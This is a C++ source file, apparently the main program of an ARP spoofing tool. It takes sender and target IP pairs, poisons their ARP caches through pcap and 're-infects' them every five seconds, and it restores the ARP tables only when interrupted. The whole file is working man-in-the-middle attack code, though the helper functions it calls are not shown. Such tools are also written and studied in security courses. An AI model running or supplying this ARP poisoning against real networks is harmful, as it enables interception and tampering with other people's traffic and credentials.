#include <cstdio>
#include <unistd.h>
#include <signal.h>
#include <pcap.h>
#include "mac.h"
#include "ip.h"
#include "arpspoof.h"

static const addressInfo* myAddressInfo_p;
static pcap_t* handle;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void sigalrmHandler(int sig){
	printf("Reinfecting Targets\n");
	infectArp(handle, *myAddressInfo_p);
	alarm(5);
}

void sigintHandler(int sig){
	printf("Recovering Target ARP table\n");
	recoverArp(handle, *myAddressInfo_p);
	printf("Terminating Program\n");
	exit(0);
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc%2)!=0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	addressInfo myAddressInfo(argv[1]);		//initializing my adresss information
	myAddressInfo_p = &myAddressInfo;
	myAddressInfo.printAddressInfo();

	for(int i=2;i<argc;i++){					//initializing targets' address information
		if(myAddressInfo.arpCache.find(argv[i]) == myAddressInfo.arpCache.end()){
			myAddressInfo.arpCache[argv[i]] = getMacFromIP(handle, myAddressInfo, argv[i]);
		}
	}

	for(int i=2;i<argc;i+=2){					//adding (senderIp, targetIp) pairs
		myAddressInfo.targetPairs.push_back(make_pair(argv[i],argv[i+1]));
		myAddressInfo.targetPairs_IP_object.push_back(make_pair(Ip(argv[i]),Ip(argv[i+1])));
	}
	
	struct sigaction sigalrmAction;				//signal handler for periodic re-infection
	struct sigaction sigintAction;				//signal handler for program termination

	sigemptyset(&sigalrmAction.sa_mask);
	sigemptyset(&sigintAction.sa_mask);
	sigalrmAction.sa_flags = sigintAction.sa_flags = 0;

	sigalrmAction.sa_handler = sigalrmHandler;
	sigintAction.sa_handler = sigintHandler;

	sigaction(SIGALRM,&sigalrmAction,0);
	sigaction(SIGINT,&sigintAction,0);
	alarm(5);
	
	spoofARP(handle, myAddressInfo);			//initiate ARP spoofing
	
	pcap_close(handle);
}